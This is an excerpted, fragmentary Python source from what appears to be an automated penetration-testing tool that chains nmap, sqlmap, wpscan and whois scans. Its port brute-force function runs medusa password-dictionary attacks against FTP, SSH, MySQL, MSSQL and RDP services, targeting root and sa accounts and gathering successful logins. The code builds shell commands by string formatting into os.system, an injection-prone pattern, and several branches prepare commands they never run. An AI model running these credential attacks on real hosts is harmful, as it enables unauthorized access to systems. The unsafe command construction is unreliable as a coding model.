...
def moduleExist(moduleName):
    ...
    import re
    import os
    os.system('''python3 -c "help('%s');" > /tmp/checkModuleExist''' % moduleName)
    with open("/tmp/checkModuleExist","r+") as f:
        out=f.read()
        os.system("rm /tmp/checkModuleExist")
...
def blog():
    ...
    os.system(ubuntuCmd) if systemPlatform!="Darwin" else os.system(macosCmd)
    ubuntuCmd="sed -i 's/categories: webshell/categories: %s/g' %s" % (categories, file_abs_path)
    #macosCmd="sed -i '' 's/categories: webshell/categories: %s/g' %s" % (categories, file_abs_path)
    macosCmd="gsed -i 's/categories: webshell/categories: %s/g' %s" % (categories, file_abs_path)
    os.system(ubuntuCmd) if systemPlatform!="Darwin" else os.system(macosCmd)
...
whois_scan_switcher varchar(50) not null default 0)"
    if exist_table_in_db("scanSwitcher", eval(get_key_value_from_config_file(configIniPath, 'default', 'db_name'))) == False:
        execute_sql_in_db(scanSwitcherSql, eval(get_key_value_from_config_file(configIniPath, 'default', 'db_name')))
    else:
...
14.whois scan(get the targets' whois info)''')
    ...
    print('''Do you want my choosing to scan all of theme by default,if you have special needs(eg.scan sqli vuls alone,etc) please input n|N , default[y]''')
...
whois_scan_switcher='1'"
        execute_sql_in_db(openAllSwitcherSql, eval(get_key_value_from_config_file(configIniPath, 'default', 'db_name')))
    else:
        while True:
...
def get_url_belong_main_target_domain(url):
    ...
    sub_main = get_source_main_target_domain_of_sub_url(url)['domain']
    ...
    a=0
    a=get_url_belong_main_target_domain(url)
    if a!=0:
        return a
...
ruby-dev build-essential libgmp-dev zlib1g-dev")
                ...
                if os.path.exists(ModulePath + "log/cms_scan_log/wpscan/" + log_file):
                    ...
                    if os.path.exists("%scms_scan/wpscan/%s" % (ModulePath,log_file))==False:
...
def sqlmap_g_human(http_url_or_file, tor_or_not, post_or_not):
    ...
    if re.match("(http://)|(https://)", http_url_or_file):
        ...
        os.system('''~/myenv/bin/python3.5 easy_search.py "%s"''' %
...
def single_portBruteCrack_scan(target):
    ...
    def portBruteCrack(ip,nmapResultString):
        ...
        returnString=""
        if os.path.exists("/usr/local/bin/medusa")==False:
            install_medusa()
        if re.search("Discovered open port 21/tcp",nmapResultString,re.I):
            cmd="medusa -h %s -U %s -P %s -t 5 -O /tmp/medusaResult -M ftp -v 6" % (ip,ModulePath+"dicts/user.txt",ModulePath+"dicts/pass.txt")
            print(cmd)
            os.system(cmd)
        ...
        if re.search("Discovered open port 22/tcp",nmapResultString,re.I):
            cmd="medusa -h %s -u root -P %s -t 5 -O /tmp/medusaResult -M ssh -v 6" % (ip,ModulePath+"dicts/pass.txt")
            os.system(cmd)
            with open("/tmp/medusaResult","r+") as f:
                content=f.read()
            if re.search(r"success",content,re.I):
        ...
        if re.search("Discovered open port 3306/tcp",nmapResultString,re.I):
            cmd="medusa -h %s -u root -P %s -t 5 -O /tmp/medusaResult -M mysql -v 6" % (ip,ModulePath+"dicts/pass.txt")
            with open("/tmp/medusaResult","r+") as f:
                content=f.read()
            if re.search(r"success",content,re.I):
                returnString+=content
        ...
        if re.search("Discovered open port 1433/tcp",nmapResultString,re.I):
            cmd="medusa -h %s -u sa -P %s -t 5 -O /tmp/medusaResult -M mssql -v 6" % (ip,ModulePath+"dicts/pass.txt")
            with open("/tmp/medusaResult","r+") as f:
                content=f.read()
            if re.search(r"success",content,re.I):
                returnString+=content
        ...
        if re.search("Discovered open port 3389/tcp",nmapResultString,re.I):
            cmd="medusa -h %s -u sa -P %s -t 5 -O /tmp/medusaResult -M rdp -v 6" % (ip,ModulePath+"dicts/pass.txt")
            with open("/tmp/medusaResult","r+") as f:
                content=f.read()
            if re.search(r"success",content,re.I):
                returnString+=content
...
please input your chioce,default [%s]:>" % str(defaultChoose), end='')
